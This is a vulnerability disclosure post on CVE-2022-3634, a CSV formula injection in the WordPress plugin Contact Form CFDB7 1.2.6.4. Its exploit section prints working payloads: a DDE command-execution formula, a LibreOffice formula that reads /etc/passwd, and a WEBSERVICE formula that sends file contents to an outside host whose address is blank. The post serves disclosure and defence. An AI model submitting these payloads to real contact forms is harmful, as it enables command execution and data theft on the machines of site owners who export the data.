---
layout: post
categories: vulns
title: "CVE-2022-3634 - Wordpress Plugins - Contact Form CFBD7 - CSV Injection"
permalink: "/:categories/:title/"
---

# Intro

As defined by OWASP : CSV Injection, also known as Formula Injection, occurs when websites embed untrusted input inside CSV files.

When a spreadsheet program such as Microsoft Excel or LibreOffice Calc is used to open a CSV, any cells starting with = will be interpreted by the software as a formula. Maliciously crafted formulas can be used for three key attacks:

* Hijacking the user’s computer by exploiting vulnerabilities in the spreadsheet software, such as CVE-2014-3524.
* Hijacking the user’s computer by exploiting the user’s tendency to ignore security warnings in spreadsheets that they downloaded from their own website.
* Exfiltrating contents from the spreadsheet, or other open spreadsheets.


# Summary

A formula injection (CSV Injection) in the Wordpress plugin **Contact Form CFDB7 version 1.2.6.4** allows an **unauthenticated attacker** to inject arbitary excel formulas via manipulation of an unsanitized parameter.


# Code analysis

The **export-csv.php** defines a method named **escape_data()** which is used for the CSV export.

Certain efforts have been made by the developers in order to prevent the injection by escaping a few characters. However, the semicolon character is allowed, leading to the formula injection.

<img src="../../assets/images/posts/vulns/contact-form-cfdb7/csv_injection_poc_code.png">

# Exploit

## Simple formula injection

The following shows the exploitation in form of a simple formula injection in the **Name** input in the contact form, which will then be passed to the plugin’s functions and inserted into the final CSV file.

An unauthenticated attacker could submit the following payload on any Wordpress website exposing a contact form.

```
# Payload 

;=1+2
```

<img src="../../assets/images/posts//vulns/contact-form-cfdb7/csv_injection_poc.png">

The wordpress user exports the form’s data and downloads the CSV file.

<img src="../../assets/images/posts//vulns/contact-form-cfdb7/csv_injection_poc_1.png">

The semicolon has been interpreted as a delimiter, the formula has been read and the result of the arithmetic operation **1+2** is printed in the cell.

<img src="../../assets/images/posts//vulns/contact-form-cfdb7/csv_injection_poc_2.png">


## Command Execution

Old versions of Microsoft Excel allow usage of [DDE](https://learn.microsoft.com/en-gb/windows/win32/dataxchg/about-dynamic-data-exchange) (Dynamic Data Exchange) in the default settings. Attackers can abuse this feature to execute commands on the target's system, once the CSV file opened.

This exploit needs the *Enable Dynamic DataExchange Server Launch* option to be enabled on **recent versions of Microsoft Excel**.

```
#Payload 

;=cmd|' /C calc'!xxx

```

<img src="../../assets/images/posts//vulns/contact-form-cfdb7/csv_injection_poc_calc_1.png">

In recent versions of Microsoft Excel, a warning message is shown before using the DDE protocol. 

<img src="../../assets/images/posts//vulns/contact-form-cfdb7/csv_injection_poc_calc_2.png">

Finally, the attacker gets a command execution on the target's system.

<img src="../../assets/images/posts//vulns/contact-form-cfdb7/csv_injection_poc_calc_3.png">


## File read and data exfiltration

Attackers can achieve a local file read and data exfiltration when the malicious CSV file is opened with LibreOffice Calc.

```
# Read line in file

;='file:///etc/passwd'#$passwd.A1

# Exfiltrate line

WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))

```

<img src="../../assets/images/posts//vulns/contact-form-cfdb7/csv_injection_poc_lfi.png">

<img src="../../assets/images/posts//vulns/contact-form-cfdb7/csv_injection_poc_lfi_1.png">

<img src="../../assets/images/posts//vulns/contact-form-cfdb7/csv_injection_poc_lfi_2.png">


# References

* Plugin URL : [https://fr.wordpress.org/plugins/contact-form-cfdb7/](https://fr.wordpress.org/plugins/contact-form-cfdb7/)
* WPScan : [https://wpscan.com/vulnerability/b5eeefb0-fb5e-4ca6-a6f0-67f4be4a2b10](https://wpscan.com/vulnerability/b5eeefb0-fb5e-4ca6-a6f0-67f4be4a2b10)
* Mitre - CVE-2022-3634 : [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3634](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3634)
* OWASP - CSV Injection : [https://owasp.org/www-community/attacks/CSV_Injection](https://owasp.org/www-community/attacks/CSV_Injection)
* Hacktricks - Formula Injection : [https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#formula-injection](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#formula-injection)
